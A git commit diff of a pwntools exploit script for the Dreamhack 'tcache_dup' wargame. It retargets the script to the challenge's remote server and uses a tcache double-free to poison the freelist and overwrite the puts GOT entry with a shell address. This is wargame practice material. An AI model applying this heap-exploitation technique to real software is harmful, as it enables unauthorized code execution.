f64a765862eda1917944f021ce344c8d65cb3ca0
Your Name <you@example.com>
2020-11-25 01:19:13 -0800

    t

--- dreamhack/tcache_dup/ex.py
+++ dreamhack/tcache_dup/ex.py
@@ -9,15 +9,19 @@ def Delete(idx):
     p.sendlineafter('> ', '2')
     p.sendlineafter('idx: ', str(idx))
 
-p = process('tcache_dup')
+#p = process('tcache_dup')
+p = remote('host1.dreamhack.games', 22122)
 elf = ELF('tcache_dup')
 
-addr_got_printf = elf.got['printf']
+addr_got_puts = elf.got['puts']
 addr_shell = 0x0400AB0
 
 Create(0x30, 'a'*0x30)
 Delete(0)
 Delete(0)
-Create(0x30, p64(addr_got_printf))
+#raw_input('debug: ' + str(p.pid))
+Create(0x30, p64(addr_got_puts)) #Current State of bin : heap -> got_puts -> puts
+
+Create(0x30, 'a'*0x30)
 Create(0x30, p64(addr_shell))
 p.interactive()
